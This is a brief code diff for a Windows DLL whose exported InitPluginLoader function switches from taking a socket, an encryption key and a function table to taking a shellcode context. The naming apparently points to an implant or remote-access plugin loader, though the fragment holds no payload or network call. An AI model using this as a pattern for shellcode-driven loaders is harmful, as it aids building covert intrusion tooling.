@@ -37,9 +37,9 @@ bool WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved){
     return true; // succesful
 }
 
-int WINAPI InitPluginLoader(SOCKET hConexion,HCRYPTKEY hKey,LoaderFunTable& lFunc){
+int WINAPI InitPluginLoader(PSHELLCODE_CONTEXT ShellContext){
     PluginManager PlugMgr;
-    //MessageBox(0,"","InitPluginLoader",0);
+    MessageBox(0,"","InitPluginLoader",0);
 
-    return PlugMgr.run(hConexion,hKey,lFunc);
+    return PlugMgr.run(ShellContext);
 }
